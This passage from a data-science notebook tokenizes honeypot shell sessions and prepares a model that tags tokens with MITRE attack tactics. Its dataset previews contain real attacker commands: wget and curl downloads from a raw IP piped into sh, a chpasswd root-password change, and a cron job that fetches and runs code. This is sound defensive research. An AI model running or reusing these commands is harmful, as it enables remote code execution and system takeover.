              "3      ls -la /dev/ttyGSM* /var/spool/sms/* /var/log/...\n",
              "4      cat /var/tmp/.systemcache436621 ; echo 1 > /va...\n",
              "                             ...                        \n",
              "246    wget -O /tmp/linux http://58.218.66.87:8080/li...\n",
              "247    enable ; system ; shell ; sh ; cat /proc/mount...\n",
              "248    uname -a ; cd /tmp ; wget http://www.studyonaz...\n",
              "249    cat /proc/cpuinfo | grep name | wc -l ; echo r...\n",
              "250    echo -e \"*/3 * * * * root (curl -fsSL $url/xms...\n",
              "Name: session, Length: 251, dtype: object"
            ],
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>session</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>rm -rf /var/run/1sh ; wget -c http://71.127.14...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>cat /proc/cpuinfo | grep name | wc -l ; echo r...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>cd /tmp || cd /var/run || cd /mnt || cd /root ...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>ls -la /dev/ttyGSM* /var/spool/sms/* /var/log/...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>cat /var/tmp/.systemcache436621 ; echo 1 &gt; /va...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>...</th>\n",
              "      <td>...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>246</th>\n",
              "      <td>wget -O /tmp/linux http://58.218.66.87:8080/li...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>247</th>\n",
              "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>248</th>\n",
              "      <td>uname -a ; cd /tmp ; wget http://www.studyonaz...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>249</th>\n",
              "      <td>cat /proc/cpuinfo | grep name | wc -l ; echo r...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>250</th>\n",
              "      <td>echo -e \"*/3 * * * * root (curl -fsSL $url/xms...</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "<p>251 rows × 1 columns</p>\n",
              "</div><br><label><b>dtype:</b> object</label>"
            ]
          },
          "metadata": {},
          "execution_count": 18
        }
      ],
      "source": [
        "train_data['session']"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "kMqwAGdQ3Cmi"
      },
      "outputs": [],
      "source": [
        "def truncate_long_words(session):\n",
        "    max_length=30\n",
        "    truncated = ' '.join([w[:max_length] for w in session.split(\" \")])\n",
        "    return truncated\n",
        "\n",
        "# Apply to all sessions in train_data\n",
        "\n",
        "train_data['trunc_session'] = train_data['session'].apply(truncate_long_words)\n",
        "train_data['trunc_session'][14]\n",
        "\n",
        "test_data['trunc_session'] = test_data['session'].apply(truncate_long_words)\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 780
        },
        "id": "SOkH0lmg3Cmi",
        "outputId": "c136bd36-76e6-48b8-d940-3d3bc2512e81"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "count    251.000000\n",
            "mean     126.382470\n",
            "std      164.671397\n",
            "min        2.000000\n",
            "25%       25.000000\n",
            "50%       64.000000\n",
            "75%      158.000000\n",
            "max      918.000000\n",
            "Name: trunc_bert_tokenized, dtype: float64 count    251.000000\n",
            "mean     108.478088\n",
            "std      144.648161\n",
            "min        2.000000\n",
            "25%       22.000000\n",
            "50%       53.000000\n",
            "75%      136.500000\n",
            "max      822.000000\n",
            "Name: trunc_uni_tokenized, dtype: float64\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<Figure size 640x480 with 1 Axes>"
            ],
            "image/png": "[encoded data removed]"
          },
          "metadata": {}
        }
      ],
      "source": [
        "from sklearn.linear_model import LinearRegression\n",
        "\n",
        "train_data['trunc_bert_tokenized'] = train_data['trunc_session'].apply(lambda x: bert_tokenizer.tokenize(x))\n",
        "train_data['trunc_uni_tokenized'] = train_data['trunc_session'].apply(lambda x: unix_tokenizer.tokenize(x))\n",
        "test_data['trunc_bert_tokenized'] = test_data['trunc_session'].apply(lambda x: bert_tokenizer.tokenize(x))\n",
        "test_data['trunc_uni_tokenized'] = test_data['trunc_session'].apply(lambda x: unix_tokenizer.tokenize(x))\n",
        "\n",
        "\n",
        "print(train_data['trunc_bert_tokenized'].apply(lambda x: len(x)).describe() ,train_data['trunc_uni_tokenized'].apply(lambda x: len(x)).describe())\n",
        "\n",
        "\n",
        "X = train_data['trunc_session'].apply(lambda x: len(x.split(\" \"))).values.reshape(-1, 1)\n",
        "y_bert = train_data['trunc_bert_tokenized'].apply(len).values\n",
        "y_unix = train_data['trunc_uni_tokenized'].apply(len).values\n",
        "\n",
        "reg_bert = LinearRegression().fit(X, y_bert)\n",
        "reg_unix = LinearRegression().fit(X, y_unix)\n",
        "\n",
        "plt.scatter(X, y_unix, label='UniXcoder', alpha=0.5)\n",
        "plt.scatter(X, y_bert, label='BERT', alpha=0.5)\n",
        "\n",
        "plt.plot(X, reg_bert.predict(X), color='blue', linewidth=2, label='BERT Regression')\n",
        "plt.plot(X, reg_unix.predict(X), color='orange', linewidth=2, label='UniXcoder Regression')\n",
        "\n",
        "plt.xlabel(\"Number of Words\")\n",
        "plt.ylabel(\"Number of Tokens\")\n",
        "plt.title(\"BERT vs UniXcoder Tokenization (with Linear Regression)\")\n",
        "plt.legend()\n",
        "plt.show()\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "yVcfTCWf3Cmj",
        "outputId": "2423b0e6-0740-4f7a-8225-beaac6ccc30d"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Bert ratio of tokens to words: \n",
            "3.037797483115297\n",
            "Unix ratio of tokens to words: \n",
            "2.5688969997023157\n"
          ]
        }
      ],
      "source": [
        "print(\"Bert ratio of tokens to words: \")\n",
        "print((y_bert/X.flatten()).mean())\n",
        "\n",
        "print(\"Unix ratio of tokens to words: \")\n",
        "print((y_unix/X.flatten()).mean())"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "3dXujBwQ3Cmk"
      },
      "source": [
        "The session with the maximum number of tokens most likely contains:\n",
        "- Very long \"words\" (e.g., base64-encoded payloads, scripts, or hex-encoded data).\n",
        "- These \"words\" are not present in the tokenizer vocabulary, so both BERT and UniXcoder must split them into many subwords/tokens to process them.\n",
        "- If the session has hundreds or thousands of characters in a single \"word,\" tokenizers will split these into a massive number of subword units, dramatically increasing the token count for the session.\n",
        "\n",
        "BERT uses the special [UNK] token to represent unknown or out-of-vocabulary words. When BERT cannot match a word in its vocabulary, it replaces the entire word with a single [UNK] token, no matter how long or complex the original word is. This keeps BERT's token count lower for sessions with strange or very long words.\n",
        "\n",
        "UniXcoder does not use [UNK]. Instead, it tries to split every unknown or rare word into the smallest possible subwords, even for very long or unusual words. As a result, the number of tokens can become extremely high for such sessions."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "4upi-KL93Cmk",
        "outputId": "ffc6e30c-538b-4165-9e41-4dfde290b8b2"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "BERT longer than model_max_length: 6, UniXcoder longer than model_max_length: 0\n"
          ]
        }
      ],
      "source": [
        "#how many tokens are longer than the max length?\n",
        "bert_long_tokens = train_data['trunc_bert_tokenized'].apply(lambda x: len(x) > bert_tokenizer.model_max_length).sum()\n",
        "unix_long_tokens = train_data['trunc_uni_tokenized'].apply(lambda x: len(x) > unix_tokenizer.model_max_length).sum()\n",
        "print(f\"BERT longer than model_max_length: {bert_long_tokens}, UniXcoder longer than model_max_length: {unix_long_tokens}\")"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "WznxopbM3Cmk"
      },
      "source": [
        "## Task 3\n",
        "Fine-tune a BERT model for Named Entity Recognition. Load the pre-trained model with\n",
        "pre-trained weights from Huggingface. Focus on a token-classification task: The model\n",
        "will try to classify each token into one of the MITRE Tactics. Compute the following\n",
        "metrics:\n",
        "1. Token classification accuracy.\n",
        "2. Macro token classification precision, recall, and f1-score.\n",
        "3. Per-class f1-score: reports the results in a barplot.\n",
        "4. Average session ‘fidelity’: for each session, the model predicts some tokens correctly.\n",
        "For each session, the ‘fidelity’ score is calculated as a fraction between the num-\n",
        "ber of correct predictions and the total number of tokens (e.g. for the session ‘cat\n",
        "cpu/procinfo;’ with the tags [‘Discovery’, ‘Discovery’, ‘Discovery’] and the predic-\n",
        "tion [‘Discovery’, ‘Discovery’, ‘Execution’], the fidelity is 32 = 0.67).\n",
        "Calculate the average fidelity for all test sessions."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 313
        },
        "id": "mma9V5G73Cml",
        "outputId": "6d583553-bf47-4537-ceca-36c046910a6a"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Train dataset contains 251 elements\n",
            "Testing dataset contains 108 elements\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "                                             session  \\\n",
              "0  rm -rf /var/run/1sh ; wget -c http://71.127.14...   \n",
              "1  cat /proc/cpuinfo | grep name | wc -l ; echo r...   \n",
              "\n",
              "                                               label  \\\n",
              "0  [Execution, Execution, Execution, Execution, E...   \n",
              "1  [Discovery, Discovery, Discovery, Discovery, D...   \n",
              "\n",
              "                                      bert_tokenized  \\\n",
              "0  [rm, -, rf, /, var, /, run, /, 1, ##sh, ;, w, ...   \n",
              "1  [cat, /, pro, ##c, /, cpu, ##in, ##fo, |, gr, ...   \n",
              "\n",
              "                                       uni_tokenized  \\\n",
              "0  [rm, Ġ-, rf, Ġ/, var, /, run, /, 1, sh, Ġ;, Ġw...   \n",
              "1  [cat, Ġ/, proc, /, cpuinfo, Ġ|, Ġgrep, Ġname, ...   \n",
              "\n",
              "                                       trunc_session  \\\n",
              "0  rm -rf /var/run/1sh ; wget -c http://71.127.14...   \n",
              "1  cat /proc/cpuinfo | grep name | wc -l ; echo r...   \n",
              "\n",
              "                                trunc_bert_tokenized  \\\n",
              "0  [rm, -, rf, /, var, /, run, /, 1, ##sh, ;, w, ...   \n",
              "1  [cat, /, pro, ##c, /, cpu, ##in, ##fo, |, gr, ...   \n",
              "\n",
              "                                 trunc_uni_tokenized  \n",
              "0  [rm, Ġ-, rf, Ġ/, var, /, run, /, 1, sh, Ġ;, Ġw...  \n",
              "1  [cat, Ġ/, proc, /, cpuinfo, Ġ|, Ġgrep, Ġname, ...  "
            ],
            "text/html": [
              "\n",
              "  <div id=\"df-7db16cd0-749a-4b53-8a0f-e5d3aa24bc26\" class=\"colab-df-container\">\n",
              "    <div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>session</th>\n",
              "      <th>label</th>\n",
              "      <th>bert_tokenized</th>\n",
              "      <th>uni_tokenized</th>\n",
              "      <th>trunc_session</th>\n",
              "      <th>trunc_bert_tokenized</th>\n",
              "      <th>trunc_uni_tokenized</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>rm -rf /var/run/1sh ; wget -c http://71.127.14...</td>\n",
              "      <td>[Execution, Execution, Execution, Execution, E...</td>\n",
              "      <td>[rm, -, rf, /, var, /, run, /, 1, ##sh, ;, w, ...</td>\n",
              "      <td>[rm, Ġ-, rf, Ġ/, var, /, run, /, 1, sh, Ġ;, Ġw...</td>\n",
              "      <td>rm -rf /var/run/1sh ; wget -c http://71.127.14...</td>\n",
              "      <td>[rm, -, rf, /, var, /, run, /, 1, ##sh, ;, w, ...</td>\n",
              "      <td>[rm, Ġ-, rf, Ġ/, var, /, run, /, 1, sh, Ġ;, Ġw...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>cat /proc/cpuinfo | grep name | wc -l ; echo r...</td>\n",
              "      <td>[Discovery, Discovery, Discovery, Discovery, D...</td>\n",
              "      <td>[cat, /, pro, ##c, /, cpu, ##in, ##fo, |, gr, ...</td>\n",
              "      <td>[cat, Ġ/, proc, /, cpuinfo, Ġ|, Ġgrep, Ġname, ...</td>\n",
              "      <td>cat /proc/cpuinfo | grep name | wc -l ; echo r...</td>\n",
              "      <td>[cat, /, pro, ##c, /, cpu, ##in, ##fo, |, gr, ...</td>\n",
              "      <td>[cat, Ġ/, proc, /, cpuinfo, Ġ|, Ġgrep, Ġname, ...</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>\n",
              "    <div class=\"colab-df-buttons\">\n",
              "\n",
              "  <div class=\"colab-df-container\">\n",
              "    <button class=\"colab-df-convert\" onclick=\"convertToInteractive('df-7db16cd0-749a-4b53-8a0f-e5d3aa24bc26')\"\n",
              "            title=\"Convert this dataframe to an interactive table.\"\n",
              "            style=\"display:none;\">\n",
              "\n",
              "  <svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\" viewBox=\"0 -960 960 960\">\n",
              "    <path d=\"M120-120v-720h720v720H120Zm60-500h600v-160H180v160Zm220 220h160v-160H400v160Zm0 220h160v-160H400v160ZM180-400h160v-160H180v160Zm440 0h160v-160H620v160ZM180-180h160v-160H180v160Zm440 0h160v-160H620v160Z\"/>\n",
              "  </svg>\n",
              "    </button>\n",
              "\n",
              "  <style>\n",
              "    .colab-df-container {\n",
              "      display:flex;\n",
              "      gap: 12px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert {\n",
              "      background-color: #E8F0FE;\n",
              "      border: none;\n",
              "      border-radius: 50%;\n",
              "      cursor: pointer;\n",
              "      display: none;\n",
              "      fill: #1967D2;\n",
              "      height: 32px;\n",
              "      padding: 0 0 0 0;\n",
              "      width: 32px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert:hover {\n",
              "      background-color: #E2EBFA;\n",
              "      box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "      fill: #174EA6;\n",
              "    }\n",
              "\n",
              "    .colab-df-buttons div {\n",
              "      margin-bottom: 4px;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert {\n",
              "      background-color: #3B4455;\n",
              "      fill: #D2E3FC;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert:hover {\n",
              "      background-color: #434B5C;\n",
              "      box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
              "      filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
              "      fill: #FFFFFF;\n",
              "    }\n",
              "  </style>\n",
              "\n",
              "    <script>\n",
              "      const buttonEl =\n",
              "        document.querySelector('#df-7db16cd0-749a-4b53-8a0f-e5d3aa24bc26 button.colab-df-convert');\n",
              "      buttonEl.style.display =\n",
              "        google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "\n",
              "      async function convertToInteractive(key) {\n",
              "        const element = document.querySelector('#df-7db16cd0-749a-4b53-8a0f-e5d3aa24bc26');\n",
              "        const dataTable =\n",
              "          await google.colab.kernel.invokeFunction('convertToInteractive',\n",
              "                                                    [key], {});\n",
              "        if (!dataTable) return;\n",
              "\n",
              "        const docLinkHtml = 'Like what you see? Visit the ' +\n",
              "          '<a target=\"_blank\" href=https://colab.research.google.com/notebooks/data_table.ipynb>data table notebook</a>'\n",
              "          + ' to learn more about interactive tables.';\n",
              "        element.innerHTML = '';\n",
              "        dataTable['output_type'] = 'display_data';\n",
              "        await google.colab.output.renderOutput(dataTable, element);\n",
              "        const docLink = document.createElement('div');\n",
              "        docLink.innerHTML = docLinkHtml;\n",
              "        element.appendChild(docLink);\n",
              "      }\n",
              "    </script>\n",
              "  </div>\n",
              "\n",
              "\n",
              "    <div id=\"df-06b35f91-c441-459b-89fc-94df610c678e\">\n",
              "      <button class=\"colab-df-quickchart\" onclick=\"quickchart('df-06b35f91-c441-459b-89fc-94df610c678e')\"\n",
              "                title=\"Suggest charts\"\n",
              "                style=\"display:none;\">\n",
              "\n",
              "<svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\"viewBox=\"0 0 24 24\"\n",
              "     width=\"24px\">\n",
              "    <g>\n",
              "        <path d=\"M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zM9 17H7v-7h2v7zm4 0h-2V7h2v10zm4 0h-2v-4h2v4z\"/>\n",
              "    </g>\n",
              "</svg>\n",
              "      </button>\n",
              "\n",
              "<style>\n",
              "  .colab-df-quickchart {\n",
              "      --bg-color: #E8F0FE;\n",
              "      --fill-color: #1967D2;\n",
              "      --hover-bg-color: #E2EBFA;\n",
              "      --hover-fill-color: #174EA6;\n",
              "      --disabled-fill-color: #AAA;\n",
              "      --disabled-bg-color: #DDD;\n",
              "  }\n",
              "\n",
              "  [theme=dark] .colab-df-quickchart {\n",
              "      --bg-color: #3B4455;\n",
              "      --fill-color: #D2E3FC;\n",
              "      --hover-bg-color: #434B5C;\n",
              "      --hover-fill-color: #FFFFFF;\n",
              "      --disabled-bg-color: #3B4455;\n",
              "      --disabled-fill-color: #666;\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart {\n",
              "    background-color: var(--bg-color);\n",
              "    border: none;\n",
              "    border-radius: 50%;\n",
              "    cursor: pointer;\n",
              "    display: none;\n",
              "    fill: var(--fill-color);\n",
              "    height: 32px;\n",
              "    padding: 0;\n",
              "    width: 32px;\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart:hover {\n",
              "    background-color: var(--hover-bg-color);\n",
              "    box-shadow: 0 1px 2px rgba(60, 64, 67, 0.3), 0 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "    fill: var(--button-hover-fill-color);\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart-complete:disabled,\n",
              "  .colab-df-quickchart-complete:disabled:hover {\n",
              "    background-color: var(--disabled-bg-color);\n",
              "    fill: var(--disabled-fill-color);\n",
              "    box-shadow: none;\n",
              "  }\n",
              "\n",
              "  .colab-df-spinner {\n",
              "    border: 2px solid var(--fill-color);\n",
              "    border-color: transparent;\n",
              "    border-bottom-color: var(--fill-color);\n",
              "    animation:\n",
              "      spin 1s steps(1) infinite;\n",
              "  }\n",
              "\n",
              "  @keyframes spin {\n",
              "    0% {\n",
              "      border-color: transparent;\n",
              "      border-bottom-color: var(--fill-color);\n",
              "      border-left-color: var(--fill-color);\n",
              "    }\n",
              "    20% {\n",
              "      border-color: transparent;\n",
              "      border-left-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "    }\n",
              "    30% {\n",
              "      border-color: transparent;\n",
              "      border-left-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "      border-right-color: var(--fill-color);\n",
              "    }\n",
              "    40% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "    }\n",
              "    60% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "    }\n",
              "    80% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "      border-bottom-color: var(--fill-color);\n",
              "    }\n",
              "    90% {\n",
              "      border-color: transparent;\n",
              "      border-bottom-color: var(--fill-color);\n",
              "    }\n",
              "  }\n",
              "</style>\n",
              "\n",
              "      <script>\n",
              "        async function quickchart(key) {\n",
              "          const quickchartButtonEl =\n",
              "            document.querySelector('#' + key + ' button');\n",
              "          quickchartButtonEl.disabled = true;  // To prevent multiple clicks.\n",
              "          quickchartButtonEl.classList.add('colab-df-spinner');\n",
              "          try {\n",
              "            const charts = await google.colab.kernel.invokeFunction(\n",
              "                'suggestCharts', [key], {});\n",
              "          } catch (error) {\n",
              "            console.error('Error during call to suggestCharts:', error);\n",
              "          }\n",
              "          quickchartButtonEl.classList.remove('colab-df-spinner');\n",
              "          quickchartButtonEl.classList.add('colab-df-quickchart-complete');\n",
              "        }\n",
              "        (() => {\n",
              "          let quickchartButtonEl =\n",
              "            document.querySelector('#df-06b35f91-c441-459b-89fc-94df610c678e button');\n",
              "          quickchartButtonEl.style.display =\n",
              "            google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "        })();\n",
              "      </script>\n",
              "    </div>\n",
              "\n",
              "    </div>\n",
              "  </div>\n"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "dataframe",
              "summary": "{\n  \"name\": \"display(test_data\",\n  \"rows\": 2,\n  \"fields\": [\n    {\n      \"column\": \"session\",\n      \"properties\": {\n        \"dtype\": \"string\",\n        \"num_unique_values\": 2,\n        \"samples\": [\n          \"cat /proc/cpuinfo | grep name | wc -l ; echo root:HGbB4i9gUXMh | chpasswd | bash ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ;\",\n          \"rm -rf /var/run/1sh ; wget -c http://71.127.148.69/.x/1sh -P /var/run && sh /var/run/1sh & rm -rf /tmp/2sh ; wget -c http://71.127.148.69/.x/2sh -P /tmp && sh /tmp/2sh & curl http://71.127.148.69/.x/3sh | sh ;\"\n        ],\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"label\",\n      \"properties\": {\n        \"dtype\": \"object\",\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"bert_tokenized\",\n      \"properties\": {\n        \"dtype\": \"object\",\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"uni_tokenized\",\n      \"properties\": {\n        \"dtype\": \"object\",\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"trunc_session\",\n      \"properties\": {\n        \"dtype\": \"string\",\n        \"num_unique_values\": 2,\n        \"samples\": [\n          \"cat /proc/cpuinfo | grep name | wc -l ; echo root:HGbB4i9gUXMh | chpasswd | bash ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ;\",\n          \"rm -rf /var/run/1sh ; wget -c http://71.127.148.69/.x/1sh -P /var/run && sh /var/run/1sh & rm -rf /tmp/2sh ; wget -c http://71.127.148.69/.x/2sh -P /tmp && sh /tmp/2sh & curl http://71.127.148.69/.x/3sh | sh ;\"\n        ],\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"trunc_bert_tokenized\",\n      \"properties\": {\n        \"dtype\": \"object\",\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"trunc_uni_tokenized\",\n      \"properties\": {\n        \"dtype\": \"object\",\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    }\n  ]\n}"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "                                             session  \\\n",
              "0  cd /tmp || cd /run || cd / ; wget http://93.11...   \n",
              "1  cat /proc/cpuinfo | grep name | wc -l ; echo -...   \n",
              "\n",
              "                                               label  \\\n",
              "0  [Execution, Execution, Execution, Execution, E...   \n",
              "1  [Discovery, Discovery, Discovery, Discovery, D...   \n",
              "\n",
              "                                      bert_tokenized  \\\n",
              "0  [cd, /, t, ##mp, |, |, cd, /, run, |, |, cd, /...   \n",
              "1  [cat, /, pro, ##c, /, cpu, ##in, ##fo, |, gr, ...   \n",
              "\n",
              "                                       uni_tokenized  \\\n",
              "0  [cd, Ġ/, tmp, Ġ||, Ġcd, Ġ/, run, Ġ||, Ġcd, Ġ/,...   \n",
              "1  [cat, Ġ/, proc, /, cpuinfo, Ġ|, Ġgrep, Ġname, ...   \n",
              "\n",
              "                                       trunc_session  \\\n",
              "0  cd /tmp || cd /run || cd / ; wget http://93.11...   \n",
              "1  cat /proc/cpuinfo | grep name | wc -l ; echo -...   \n",
              "\n",
              "                                trunc_bert_tokenized  \\\n",
              "0  [cd, /, t, ##mp, |, |, cd, /, run, |, |, cd, /...   \n",
              "1  [cat, /, pro, ##c, /, cpu, ##in, ##fo, |, gr, ...   \n",
              "\n",
              "                                 trunc_uni_tokenized  \n",
              "0  [cd, Ġ/, tmp, Ġ||, Ġcd, Ġ/, run, Ġ||, Ġcd, Ġ/,...  \n",
              "1  [cat, Ġ/, proc, /, cpuinfo, Ġ|, Ġgrep, Ġname, ...  "
            ],
            "text/html": [
              "\n",
              "  <div id=\"df-f3872325-73bb-46fa-81f5-af025bc4b6a5\" class=\"colab-df-container\">\n",
              "    <div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>session</th>\n",
              "      <th>label</th>\n",
              "      <th>bert_tokenized</th>\n",
              "      <th>uni_tokenized</th>\n",
              "      <th>trunc_session</th>\n",
              "      <th>trunc_bert_tokenized</th>\n",
              "      <th>trunc_uni_tokenized</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>cd /tmp || cd /run || cd / ; wget http://93.11...</td>\n",
              "      <td>[Execution, Execution, Execution, Execution, E...</td>\n",
              "      <td>[cd, /, t, ##mp, |, |, cd, /, run, |, |, cd, /...</td>\n",
              "      <td>[cd, Ġ/, tmp, Ġ||, Ġcd, Ġ/, run, Ġ||, Ġcd, Ġ/,...</td>\n",
              "      <td>cd /tmp || cd /run || cd / ; wget http://93.11...</td>\n",
              "      <td>[cd, /, t, ##mp, |, |, cd, /, run, |, |, cd, /...</td>\n",
              "      <td>[cd, Ġ/, tmp, Ġ||, Ġcd, Ġ/, run, Ġ||, Ġcd, Ġ/,...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>cat /proc/cpuinfo | grep name | wc -l ; echo -...</td>\n",
              "      <td>[Discovery, Discovery, Discovery, Discovery, D...</td>\n",
              "      <td>[cat, /, pro, ##c, /, cpu, ##in, ##fo, |, gr, ...</td>\n",
              "      <td>[cat, Ġ/, proc, /, cpuinfo, Ġ|, Ġgrep, Ġname, ...</td>\n",
              "      <td>cat /proc/cpuinfo | grep name | wc -l ; echo -...</td>\n",
              "      <td>[cat, /, pro, ##c, /, cpu, ##in, ##fo, |, gr, ...</td>\n",
              "      <td>[cat, Ġ/, proc, /, cpuinfo, Ġ|, Ġgrep, Ġname, ...</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>\n",
              "    <div class=\"colab-df-buttons\">\n",
              "\n",
              "  <div class=\"colab-df-container\">\n",
              "    <button class=\"colab-df-convert\" onclick=\"convertToInteractive('df-f3872325-73bb-46fa-81f5-af025bc4b6a5')\"\n",
              "            title=\"Convert this dataframe to an interactive table.\"\n",
              "            style=\"display:none;\">\n",
              "\n",
              "  <svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\" viewBox=\"0 -960 960 960\">\n",
              "    <path d=\"M120-120v-720h720v720H120Zm60-500h600v-160H180v160Zm220 220h160v-160H400v160Zm0 220h160v-160H400v160ZM180-400h160v-160H180v160Zm440 0h160v-160H620v160ZM180-180h160v-160H180v160Zm440 0h160v-160H620v160Z\"/>\n",
              "  </svg>\n",
              "    </button>\n",
              "\n",
              "  <style>\n",
              "    .colab-df-container {\n",
              "      display:flex;\n",
              "      gap: 12px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert {\n",
              "      background-color: #E8F0FE;\n",
              "      border: none;\n",
